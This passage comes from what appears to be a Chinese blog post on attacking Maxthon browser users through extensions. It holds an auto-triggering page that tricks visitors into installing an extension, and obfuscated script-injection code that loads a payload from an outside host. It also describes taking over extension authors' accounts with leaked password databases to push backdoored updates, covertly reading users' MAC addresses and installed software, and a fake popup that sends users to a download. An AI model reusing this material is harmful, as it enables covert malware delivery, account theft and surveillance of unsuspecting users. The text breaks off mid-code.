class="line">    var pvItem;</div><div class="line">    var frameVersion = getVersionArr(frameVersion);</div><div class="line">    var packMxVersion = getVersionArr(packMxVersion);</div><div class="line">    // 定义增长索引值.</div><div class="line">    var i = 0;</div><div class="line">    while (1) &#123;</div><div class="line">        fvItem = frameVersion[i];</div><div class="line">        pvItem = packMxVersion[i];</div><div class="line">        if (fvItem == null &amp;&amp; pvItem == null) &#123;</div><div class="line">            return 0;</div><div class="line">        &#125;</div><div class="line">        if (fvItem == null) &#123;</div><div class="line">            return -1;</div><div class="line">        &#125;</div><div class="line">        if (pvItem == null) &#123;</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">        if (fvItem != pvItem) &#123;</div><div class="line">            var value = fvItem &gt; pvItem ? 1 : -1</div><div class="line">            return value;</div><div class="line">        &#125;</div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">function getVersionArr(version) &#123;</div><div class="line">    var versionArr = version.split(&apos;.&apos;);</div><div class="line">    for (var i = 0; i &lt; versionArr.length; i++) &#123;</div><div class="line">        versionArr[i] = parseInt(versionArr[i], 10);</div><div class="line">    &#125;;</div><div class="line">    return versionArr;</div><div class="line">&#125;</div><div class="line">function getUser(id) &#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">        type: &apos;GET&apos;,</div><div class="line">        url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id,</div><div class="line">        data: &apos;data&apos;,</div><div class="line">        dataType: &apos;json&apos;,</div><div class="line">        success: function (data) &#123;&#125;,</div><div class="line">        error: function () &#123;&#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123;</div><div class="line">    event.preventDefault();</div><div class="line">    event.stopPropagation();</div><div class="line">    getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>详情可以在<a href="http://extension.maxthon.cn/js/temp.js" target="_blank" rel="external">http://extension.maxthon.cn/js/temp.js</a>里第1256行到1600行查看原始代码。</p>
<p>此处的代码里的入口处就在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123;</div><div class="line">    event.preventDefault();</div><div class="line">    event.stopPropagation();</div><div class="line">    getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>当点击id为<code>app-install</code>的DOM时，会先调用<code>getInstallMessage</code>函数，<code>getInstallMessage</code>函数里再调用<code>installPack</code>函数，<code>installPack</code>函数调用<code>returnIsInstall</code>函数和<code>getUser</code>函数，<code>returnIsInstall</code>函数调用了<code>getVersionArr</code>函数。</p>
<p>最核心的代码在installPack函数里的<code>external.mxCall(&#39;InstallApp&#39;, packUrl);</code>，但是无法直接调用，不然无法安装。而且这里的packUrl必须是<code>http://extension.maxthon.cn</code>下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。</p>
<p>上面说到当点击id为<code>app-install</code>的DOM时才会触发，我这个人比较懒。就直接copy遨游插件的html代码了，顺便把他隐藏了：<br><code>&lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;</code>，这里的file_id为<code>&lt;?echo $view_id;?&gt;</code>估计是遨游的程序员没写好代码，PHP没解析成功，解析成html代码了。但是我懒得改，就这样把。然后我再在他们的后面增加<code>$(&quot;#app-install&quot;).click();</code>代码，让他自动触发</p>
<p>完整的网站代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</div><div class="line">    &lt;title&gt;欺骗用户安装插件&lt;/title&gt;</div><div class="line">    &lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    欺骗用户安装插件demo1</div><div class="line">    &lt;a id=&quot;app-install&quot; style=&quot;display:none;&quot; file_def=&quot;1.0.1&quot; file_url=&quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&quot; file_id=&quot;&lt;?echo $view_id;?&gt;&quot;&gt;安装&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;script src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    setTimeout(function()&#123;</div><div class="line">        if(typeof(plug_setup)!=&quot;function&quot;)&#123;</div><div class="line">            alert(&quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后打开此页面&quot;);</div><div class="line">            var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos;</div><div class="line">            function getInstallMessage(that, messagePack, type) &#123;</div><div class="line">                if (external.mxCall) &#123;</div><div class="line">                    var packMxAttr = $(that).closest(messagePack);</div><div class="line">                    if (type === &apos;skin&apos;) &#123;</div><div class="line">                        // 浏览器框架版本号</div><div class="line">                        var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;);</div><div class="line">                    &#125;</div><div class="line">                    else if (type === &apos;app&apos;) &#123;</div><div class="line">                        // 浏览器框架版本号</div><div class="line">                        var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;);</div><div class="line">                        // 下个版本上了就删掉--</div><div class="line">                        if (frameVersion === &apos;1.0.0&apos;) &#123;</div><div class="line">                            frameVersion = &apos;1.0.1&apos;;</div><div class="line">                        &#125;</div><div class="line">                        // --下个版本上了就删掉</div><div class="line">                    &#125;</div><div class="line">                    // 插件包框架版本号</div><div class="line">                    var packMxVersion = packMxAttr.attr(&apos;file_def&apos;);</div><div class="line">                    // 插件包url</div><div class="line">                    var packUrl = packMxAttr.attr(&apos;file_url&apos;);</div><div class="line">                    // 插件id</div><div class="line">                    var packId = packMxAttr.attr(&apos;file_id&apos;);</div><div class="line">                    console.log(frameVersion, packMxVersion, packUrl, type, packId)</div><div class="line">                    installPack(frameVersion, packMxVersion, packUrl, type, packId);</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            function installPack(frameVersion, packMxVersion, packUrl, type, packId) &#123;</div><div class="line">                var isInstall = returnIsInstall(frameVersion, packMxVersion);</div><div class="line">                if (isInstall !== -1) &#123;</div><div class="line">                    if (type === &apos;skin&apos;) &#123;</div><div class="line">                        external.mxCall(&apos;InstallSkin&apos;, packUrl);</div><div class="line">                    &#125;</div><div class="line">                    else if (type === &apos;app&apos;) &#123;</div><div class="line">                        external.mxCall(&apos;InstallApp&apos;, packUrl);</div><div class="line">                    &#125;</div><div class="line">                    getUser(packId);</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            function returnIsInstall(frameVersion, packMxVersion) &#123;</div><div class="line">                var fvItem;</div><div class="line">                var pvItem;</div><div class="line">                var frameVersion = getVersionArr(frameVersion);</div><div class="line">                var packMxVersion = getVersionArr(packMxVersion);</div><div class="line">                // 定义增长索引值.</div><div class="line">                var i = 0;</div><div class="line">                while (1) &#123;</div><div class="line">                    fvItem = frameVersion[i];</div><div class="line">                    pvItem = packMxVersion[i];</div><div class="line">                    if (fvItem == null &amp;&amp; pvItem == null) &#123;</div><div class="line">                        return 0;</div><div class="line">                    &#125;</div><div class="line">                    if (fvItem == null) &#123;</div><div class="line">                        return -1;</div><div class="line">                    &#125;</div><div class="line">                    if (pvItem == null) &#123;</div><div class="line">                        return 1;</div><div class="line">                    &#125;</div><div class="line">                    if (fvItem != pvItem) &#123;</div><div class="line">                        var value = fvItem &gt; pvItem ? 1 : -1</div><div class="line">                        return value;</div><div class="line">                    &#125;</div><div class="line">                    i++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            function getVersionArr(version) &#123;</div><div class="line">                var versionArr = version.split(&apos;.&apos;);</div><div class="line">                for (var i = 0; i &lt; versionArr.length; i++) &#123;</div><div class="line">                    versionArr[i] = parseInt(versionArr[i], 10);</div><div class="line">                &#125;;</div><div class="line">                return versionArr;</div><div class="line">            &#125;</div><div class="line">            function getUser(id) &#123;</div><div class="line">                $.ajax(&#123;</div><div class="line">                    type: &apos;GET&apos;,</div><div class="line">                    url: &apos;http://extension.maxthon.cn/common/ajax.php?id=&apos; + id,</div><div class="line">                    data: &apos;data&apos;,</div><div class="line">                    dataType: &apos;json&apos;,</div><div class="line">                    success: function (data) &#123;&#125;,</div><div class="line">                    error: function () &#123;&#125;</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            $(document).delegate(&apos;#app-install&apos;, &apos;click&apos;, function (event) &#123;</div><div class="line">                event.preventDefault();</div><div class="line">                event.stopPropagation();</div><div class="line">                getInstallMessage(this, &apos;a[file_def]&apos;, &apos;app&apos;);</div><div class="line">            &#125;);</div><div class="line">            $(&quot;#app-install&quot;).click();</div><div class="line">        &#125;</div><div class="line">    &#125;,1000);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>打开后的样子:</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/2.png" alt=""></p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/3.png" alt=""></p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/4.png" alt=""></p>
<p>这处的LOL战绩查询插件是我之前上传的(不要安装)。真正攻击时可以换成不要那么二的名字，比如”网站增强工具”等</p>
<p>一开始，我还想试试能不能点击劫持，这样就可以在用户不知情的情况下安装插件，但是这个安装程序不是在页面里面的。无法进行劫持，随之放弃。</p>
<p>这样一来，尽量让用户少思考的网页就做好了。发布，等待用户上钩吧。这个方法可以与APT攻击中的”水坑攻击”进行相结合，以达到针对性某些特殊的群体或个体的攻击方式</p>
<h5 id="0x1-2-被动等待"><a href="#0x1-2-被动等待" class="headerlink" title="0x1.2 被动等待"></a>0x1.2 被动等待</h5><p>这个办法是属于广撒网，当没有指定性群体或者个人，只是为了单纯的攻击或者研究时使用。</p>
<p>这里也有一些小技巧，当开发者上传插件时，遨游审核人员会对插件进行审核，如果发现危害用户的代码，将不给予通过，乍一看没什么问题，但是没有后续了。</p>
<blockquote>
<p>没有定期自动化扫描插件代码</p>
<p>而且即使插件是一个小游戏用，都可以在配置文件def.json里申请权限是最高的</p>
<p>当代码量足够多的时候，开发人员可以把一些危害到用户请求的代码进行加密混编绕过审查人员的眼睛。（调用伟大的人民领袖毛主席的一句话:与规矩斗，其乐无穷。与代码斗其乐无穷。与人斗其乐无穷。）</p>
<p>可以在插件里调用第三方的JavaScript代码，第三方url可以指向任何域名。没有进行判断URL及js文件是否为可信</p>
</blockquote>
<p>利用以上的问题，我们就可以写出一个具有危害到用户插件，且绕过审查人员的眼睛。</p>
<p>我们可以在插件源码base.js文件里写<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//xxxxx其他多余的代码</span></div><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">script.src = <span class="string">"http://你的域名/javascript文件名.js"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(script);</div><div class="line"><span class="comment">//xxxxx其他多余的代码</span></div></pre></td></tr></table></figure></p>
<p>如果不放心可可以加密成下面的这种格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;o 7=[&quot;\\e\\c\\g\\b\\a\\9&quot;,&quot;\\c\\g\\6\\8\\9\\6\\q\\h\\6\\j\\6\\f\\9&quot;,&quot;\\e\\g\\c&quot;,&quot;\\m\\9\\9\\a\\t\\i\\i\\d\\n\\j\\8\\b\\f\\i\\l\\8\\s\\8\\e\\c\\g\\b\\a\\9\\r\\b\\h\\6\\f\\8\\j\\6\\u\\l\\e&quot;,&quot;\\8\\a\\a\\6\\f\\d\\w\\m\\b\\h\\d&quot;,&quot;\\x\\n\\d\\v&quot;];o k=p[7[1]](7[0]);k[7[2]]=7[3];p[7[5]][7[4]](k)&apos;,34,34,&apos;||||||x65|_0|x61|x74|x70|x69|x63|x64|x73|x6E|x72|x6C|x2F|x6D|script|x6A|x68|x6F|var|document|x45|x66|x76|x3A|x2E|x79|x43|x62&apos;.split(&apos;|&apos;),0,&#123;&#125;))</div></pre></td></tr></table></figure></p>
<p>方法为：先在<a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator</a>上把正常的javascript代码加密成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var _0x67c5=[&quot;\x73\x63\x72\x69\x70\x74&quot;,&quot;\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74&quot;,&quot;\x73\x72\x63&quot;,&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x66\x69\x6C\x65\x6E\x61\x6D\x65\x2E\x6A\x73&quot;,&quot;\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64&quot;,&quot;\x62\x6F\x64\x79&quot;];var script=document[_0x67c5[1]](_0x67c5[0]);script[_0x67c5[2]]= _0x67c5[3];document[_0x67c5[5]][_0x67c5[4]](script)</div></pre></td></tr></table></figure></p>
<p>如图：</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/5.png" alt=""></p>
<p>因为这样的代码看起来着实有点可疑…所以再去<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="external">站长之家</a>加密成常见的加密代码:</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/6.png" alt=""></p>
<p>嗯，看着正常多了。放在众多代码之中，审查人员也很难找到(也不会用心找的)</p>
<p>提交后，会在遨游插件的首页显示最近更新的插件，你只需要每个星期随便增加一点代码或者删除一点代码，再更新一下插件，你的插件就会常年存在插件首页，安装人数想不多都难。</p>
<h5 id="0x1-3-基于社工库控制插件作者的账户"><a href="#0x1-3-基于社工库控制插件作者的账户" class="headerlink" title="0x1.3 基于社工库控制插件作者的账户"></a>0x1.3 基于社工库控制插件作者的账户</h5><p>这个也是我个人来说最喜欢的方式，毕竟不得不承认不劳而获真的好爽啊。</p>
<p>因为Maxthon更新插件时没有像Chrome那样需要秘钥才可以更新，所以导致这个’逻辑漏洞’’。因为没有验证当前是否为作者本人的机制，才导致这个方法的可行性。</p>
<p>之前加了maxthon插件的作者群：203339427</p>
<p>里面大多都是插件的开发人员，拿他们的邮箱、QQ放在社工库里进行查询，得到密码后可以进行尝试登陆。当然因为不确定是作者使用的是哪个邮箱，我们先拿QQ邮箱登录，他会提示账户或密码错误，不知道是账户错误还是密码错误，可以先去<a href="https://my.maxthon.cn/recover.html" target="_blank" rel="external">遨游账户中心-忘记密码</a>先填写QQ邮箱，如果说用户名不存在，我们可以在网上搜索一下这个作者其他的邮箱，再进行测试(我测试的账户里，很多都需要在网上搜索一下其他的邮箱)。因为之前我把这个当做漏洞提交给wooyun了，遨游没什么反应。本来是想登陆其他用户说明的，但是wooyun暂时休整，无法看到我之前的漏洞详情，而当时社到的账户和密码也没有备份，只在wooyun漏洞详情里有，没有办法，所以这里我就以我自己为例：</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/7.png" alt=""></p>
<p>这里有个<code>更新文件</code>，我们这个时候，可以先把文件download本地，在里面的javascript文件里植入我们的后门。再上传上去。就可以控制1000多个用户了。插件二次审核查的更松。</p>
<p>而且当你打开遨游浏览器时，遨游浏览器会检测你的插件是否为最新的，如果不是最新的，他会在后台静默安装最新的插件。这个时候对我们的帮助特别大。比如我们更新插件后，只需要等待用户重新打开遨游浏览器就可以实现了攻击的效果。</p>
<p>更新的时候，就这个账户当做自己的账户就行了，然后照着0x1.2代码写上去就没问题了。</p>
<h5 id="0x1-4-控制插件里调用的第三方javascript代码"><a href="#0x1-4-控制插件里调用的第三方javascript代码" class="headerlink" title="0x1.4 控制插件里调用的第三方javascript代码"></a>0x1.4 控制插件里调用的第三方javascript代码</h5><p>这个方法比较繁琐，有两种方法来获取第三方的javascript，分为两种情况</p>
<blockquote>
<p>不具有可视化页面</p>
<p>具有可视化页面</p>
</blockquote>
<h6 id="0x1-4-1-不具有可视化页面"><a href="#0x1-4-1-不具有可视化页面" class="headerlink" title="0x1.4.1 不具有可视化页面"></a>0x1.4.1 不具有可视化页面</h6><p>类似我上面所说的，在插件的<code>def.json</code>配置文件里写上:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">"actions": [&#123;</div><div class="line">    "type": "script",</div><div class="line">    "entryPoints": [</div><div class="line">        "doc_onload"</div><div class="line">    ],</div><div class="line">    "js": [</div><div class="line">        "base.js"</div><div class="line">    ],</div><div class="line">    "include": ["*"],</div><div class="line">    "includeFrames": true</div><div class="line">&#125;]</div></pre></td></tr></table></figure></p>
<p>然后在base.js文件里写入你要调用的第三方javascript文件：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">script.src = <span class="string">"http://119.29.58.242/control.js"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(script);</div></pre></td></tr></table></figure></p>
<p>像这种的话，就需要在把插件download本地，然后使用maxthon官方提供的<a href="http://bbs.maxthon.cn/thread-664-1-1.html" target="_blank" rel="external">MxPacker</a>软件，进行的解密，首先分析<code>def.json</code>里的action字段下的js属性，指向的是哪个javascript文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在’document.createElement’关键字。</p>
<p>找到后，接下来就是苦力活了，入侵这个第三方javascript所属的网站。入侵后再修改这个javascript文件，就行了。</p>
<h6 id="0x1-4-2-具有可视化页面"><a href="#0x1-4-2-具有可视化页面" class="headerlink" title="0x1.4.2 具有可视化页面"></a>0x1.4.2 具有可视化页面</h6><p>这个比上面0x1.4.1简单点，使用之前长短短在zone分享的代码就可以把这个页面所有第三方的javascript文件列举出来：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,tags=<span class="built_in">document</span>.querySelectorAll(<span class="string">'iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'</span>),tag;tag=tags[i];i++)&#123;</div><div class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</div><div class="line">  a.href = tag.src||tag.href||tag.data;</div><div class="line">  <span class="keyword">if</span>(a.hostname!=location.hostname)&#123;</div><div class="line">    <span class="built_in">console</span>.warn(location.hostname+<span class="string">' 发现第三方资源['</span>+tag.localName+<span class="string">']:'</span>+a.href);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>使用方法如下：</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/8.png" alt=""></p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/9.png" alt=""></p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/10.png" alt=""></p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/11.png" alt=""></p>
<p>使用的时候，会发现有的插件是调用了插件本身的javascript文件，或者其他baidu、360等第三方安全不容易被入侵的网站里的javascript代码，这个时候就比较费时费力了。</p>
<h5 id="0x1-4-3-控制插件里调用的第三方javascript代码总结"><a href="#0x1-4-3-控制插件里调用的第三方javascript代码总结" class="headerlink" title="0x1.4.3 控制插件里调用的第三方javascript代码总结"></a>0x1.4.3 控制插件里调用的第三方javascript代码总结</h5><p>这个方法较为繁琐，优点如下：</p>
<blockquote>
<p>不容易被发现</p>
<p>向上反查也比较难追踪</p>
</blockquote>
<p>缺点：</p>
<blockquote>
<p>费时费力</p>
<p>成功率较低</p>
</blockquote>
<p>此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。</p>
<h4 id="0x2-那些隐藏的API："><a href="#0x2-那些隐藏的API：" class="headerlink" title="0x2 那些隐藏的API："></a>0x2 那些隐藏的API：</h4><hr>
<p>因为一些API获得的信息比较隐私，所以遨游官方没在在API手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的Console输入external来查看一些遨游官方隐藏的API。</p>
<p>还有一种是在插件页面的里专用API，插件里的API基本上每个版本上都会发生变化，下面是3.x版本的API：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">maxthon.system.Utility.getMacAddresses() <span class="comment">//获取用户的MAC地址</span></div><div class="line">maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() <span class="comment">//获取用户当前所有的字体文</span></div><div class="line">maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() <span class="comment">//用户当前应用的字体</span></div><div class="line">maxthon.io.File.createTempFile().name_ <span class="comment">//获取用户临时目录</span></div><div class="line">maxthon.io.File.createTempFile().isFile <span class="comment">//判断name_文件是否存在，但是这里我无法重新设置name_的值</span></div></pre></td></tr></table></figure></p>
<p>下面是最新版本4.x版本的API：</p>
<p>遨游把之前在maxthon对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mx.app.getAvatar()    <span class="comment">//获得当前登录用户的头像(data:image/png;base64格式)</span></div><div class="line">mx.app.login()    <span class="comment">//判断是否登录了遨游浏览器(登录返回true，没登陆返回false)</span></div><div class="line">mx.app.getProfile()    <span class="comment">//获得用户当前的状态(是否登录、uid、用户名称)</span></div><div class="line">mx.app.getSystemLocale()    <span class="comment">//获得系统语言(例如：zh-cn)</span></div><div class="line">mx.app.showUserPanel()    <span class="comment">//显示用户菜单(相当于点击左上角的头像)</span></div><div class="line"><span class="comment">//以上的代码需要事先运行mx.app.user()、mx.app.locale()</span></div><div class="line"></div><div class="line">clientInformation.plugins     <span class="comment">//浏览器支持的插件(可看到用户安装哪些软件)</span></div><div class="line">clientInformation.mimeTypes    <span class="comment">//列举出支持的application(可看到用户安装哪些软件)</span></div></pre></td></tr></table></figure></p>
<p>这里针对最后两个API截图看下：</p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/12.png" alt=""></p>
<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/13.png" alt=""></p>
<p>这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。</p>
<h4 id="0x3-攻击向量："><a href="#0x3-攻击向量：" class="headerlink" title="0x3 攻击向量："></a>0x3 攻击向量：</h4><hr>
<p>普通的获取cookies我们就不说了，介绍点其他的。</p>
<p>上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下：</p>
<blockquote>
<p>弹窗欺骗用户说需要下载软件，其实是木马程序</p>
<p>使用浏览器漏洞进行攻击</p>
<p>替换下载链接</p>
</blockquote>
<h5 id="0x3-1-弹窗欺骗用户下载软件"><a href="#0x3-1-弹窗欺骗用户下载软件" class="headerlink" title="0x3.1 弹窗欺骗用户下载软件"></a>0x3.1 弹窗欺骗用户下载软件</h5><p>这一步很简单，就是一些简单的javascript代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//闭包函数，防止变量污染</span></div><div class="line">    alert(<span class="string">"请下载xxx安全插件保障您在此网站的安全"</span>);</div><div class="line">    location.href = <span class="string">"http://baidu.com/download/xxxx.exe"</span>;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p>
<p>但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//闭包函数，防止变量污染</span></div><div class="line">    <span class="keyword">var</span> downDate = <span class="keyword">new</span> <span class="built_in">Date</span>();  <span class="comment">//获取当前的时间</span></div><div class="line">    <span class="keyword">var</span> downDateY = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">3</span>]; <span class="comment">//年份</span></div><div class="line">    <span class="keyword">var</span> downDateM = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">1</span>]; <span class="comment">//月份</span></div><div class="line">    <span class="keyword">var</span> downDateD = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">2</span>]; <span class="comment">//日期</span></div><div class="line">    <span class="keyword">var</span> 